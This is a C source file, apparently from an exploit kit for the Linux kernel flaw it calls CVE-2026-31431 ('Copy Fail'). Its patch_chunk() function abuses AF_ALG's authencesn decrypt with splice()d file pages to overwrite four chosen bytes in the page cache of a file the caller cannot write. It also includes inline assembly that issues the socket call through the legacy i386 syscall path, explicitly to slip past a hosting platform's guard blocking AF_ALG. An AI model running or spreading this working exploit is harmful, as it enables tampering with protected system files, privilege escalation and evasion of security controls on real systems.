/* SPDX-License-Identifier: LGPL-2.1-or-later OR MIT */
/*
 * Copy Fail -- CVE-2026-31431
 * Shared AF_ALG/splice page-cache mutation primitive.
 *
 * patch_chunk() runs one bogus AEAD-decrypt through AF_ALG whose
 * ciphertext input is supplied via splice() from the target file's
 * page-cache pages. The authencesn template's in-place optimization
 * treats the splice'd source pages as both ciphertext input and
 * plaintext destination, so the (failing) decrypt has already
 * overwritten 4 bytes of the page-cache page by the time
 * authentication verification rejects the request.
 */

#define _GNU_SOURCE
#include "utils.h"

#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/socket.h>
#include <sys/uio.h>

#include <linux/if_alg.h>
#include <errno.h>

/* --- i386 ABI bypass (Railway runtime-v2 guard blocks x86_64 socket(AF_ALG)) --- */
__asm__(
".text\n"
".global int80_arr\n"
".type int80_arr,@function\n"
"int80_arr:\n"
"    pushq %rbx\n"
"    pushq %rbp\n"
"    movq %rsi, %r10\n"
"    movl %edi, %eax\n"
"    movl 0(%r10), %ebx\n"
"    movl 4(%r10), %ecx\n"
"    movl 8(%r10), %edx\n"
"    movl 12(%r10), %esi\n"
"    movl 16(%r10), %edi\n"
"    movl 20(%r10), %ebp\n"
"    int $0x80\n"
"    popq %rbp\n"
"    popq %rbx\n"
"    ret\n"
".size int80_arr,.-int80_arr\n"
);
extern long int80_arr(long nr, unsigned int *args);
static unsigned int SARGS[6];   /* static => low address (non-PIE), 32-bit safe */
static unsigned int I80A[6];
static long i386_socket(long fam, long type, long proto){
    SARGS[0]=(unsigned) fam; SARGS[1]=(unsigned) type; SARGS[2]=(unsigned) proto;
    SARGS[3]=0; SARGS[4]=0; SARGS[5]=0;
    I80A[0]=1u; I80A[1]=(unsigned int)(unsigned long)SARGS; I80A[2]=0; I80A[3]=0; I80A[4]=0; I80A[5]=0;
    return int80_arr(102, I80A); /* i386 __NR_socketcall, call=SYS_SOCKET */
}


#ifndef AF_ALG
#  define AF_ALG 38
#endif
#ifndef SOL_ALG
#  define SOL_ALG 279
#endif

/* Authenc key blob (rtnetlink-style attribute):
 *   u16 rta_len   = 0x0008  (host-endian, LE on x86)
 *   u16 rta_type  = 0x0001  (CRYPTO_AUTHENC_KEY_PARAM, host-endian)
 *   __be32 enckeylen = 16   (BIG-ENDIAN -- kernel declares this as __be32
 *                            in include/crypto/internal/authenc.h)
 * followed by 32 bytes of key material:
 *   16 bytes HMAC-SHA-256 auth key (length is unrestricted)
 *   16 bytes AES-128 enc key
 * All zero. The key value is irrelevant; the primitive only needs setkey
 * to succeed so subsequent sendmsg/splice ops are accepted. */
static const unsigned char AUTHENC_KEY[8 + 32] = {
    0x08, 0x00, 0x01, 0x00,
    0x00, 0x00, 0x00, 0x10,
};

int patch_chunk(int file_fd, off_t offset,
                const unsigned char four_bytes[4]) {
    int ctrl_sock = -1, op_sock = -1, pipefd[2] = { -1, -1 };
    int rc = -1;

    {
        long _r = i386_socket(AF_ALG, SOCK_SEQPACKET, 0);
        fprintf(stderr, "[dbg] int80 socketcall(SYS_SOCKET, AF_ALG) -> %ld\n", _r);
        if (_r >= 0) { ctrl_sock = (int) _r; }
        else { errno = (int) -_r; ctrl_sock = socket(AF_ALG, SOCK_SEQPACKET, 0); }
    }
    if (ctrl_sock < 0) { perror("socket(AF_ALG)"); goto out; }

    struct sockaddr_alg sa = { .salg_family = AF_ALG };
    memcpy(sa.salg_type, "aead", 5);
    memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))",
           sizeof "authencesn(hmac(sha256),cbc(aes))");

    if (bind(ctrl_sock, (struct sockaddr *)&sa, sizeof sa) < 0) {
        perror("bind(AF_ALG: authencesn(hmac(sha256),cbc(aes)))");
        goto out;
    }

    if (setsockopt(ctrl_sock, SOL_ALG, ALG_SET_KEY,
                   AUTHENC_KEY, sizeof AUTHENC_KEY) < 0) {
        perror("setsockopt(ALG_SET_KEY)"); goto out;
    }

    if (setsockopt(ctrl_sock, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4) < 0) {
        perror("setsockopt(ALG_SET_AEAD_AUTHSIZE)"); goto out;
    }

    op_sock = accept(ctrl_sock, NULL, 0);
    if (op_sock < 0) { perror("accept(AF_ALG)"); goto out; }

    size_t splice_len = (size_t)offset + 4;

    unsigned char aad[8] = {
        'A', 'A', 'A', 'A',
        four_bytes[0], four_bytes[1], four_bytes[2], four_bytes[3],
    };
    struct iovec iov = { .iov_base = aad, .iov_len = sizeof aad };

    union {
        struct cmsghdr align;
        unsigned char buf[
            CMSG_SPACE(sizeof(uint32_t)) +
            CMSG_SPACE(sizeof(struct af_alg_iv) + 16) +
            CMSG_SPACE(sizeof(uint32_t))
        ];
    } cbuf;
    memset(&cbuf, 0, sizeof cbuf);

    struct msghdr msg = {
        .msg_iov        = &iov,
        .msg_iovlen     = 1,
        .msg_control    = cbuf.buf,
        .msg_controllen = sizeof cbuf.buf,
    };

    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_OP;
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cm) = ALG_OP_DECRYPT;

    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_IV;
    cm->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + 16);
    struct af_alg_iv *iv = (struct af_alg_iv *)CMSG_DATA(cm);
    iv->ivlen = 16;
    memset(iv->iv, 0, 16);

    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cm) = 8;

    if (sendmsg(op_sock, &msg, MSG_MORE) < 0) {
        perror("sendmsg(AAD + cmsgs)");
        goto out;
    }

    if (pipe(pipefd) < 0) { perror("pipe"); goto out; }

    off_t src_off = 0;
    if (splice(file_fd, &src_off, pipefd[1], NULL, splice_len, 0) < 0) {
        perror("splice(file -> pipe)");
        goto out;
    }
    if (splice(pipefd[0], NULL, op_sock, NULL, splice_len, 0) < 0) {
        perror("splice(pipe -> op_sock)");
        goto out;
    }

    unsigned char *sink = malloc(8 + (size_t)offset);
    if (sink) {
        (void)recv(op_sock, sink, 8 + (size_t)offset, 0);
        free(sink);
    }

    rc = 0;

out:
    if (pipefd[0] >= 0) close(pipefd[0]);
    if (pipefd[1] >= 0) close(pipefd[1]);
    if (op_sock   >= 0) close(op_sock);
    if (ctrl_sock >= 0) close(ctrl_sock);
    return rc;
}
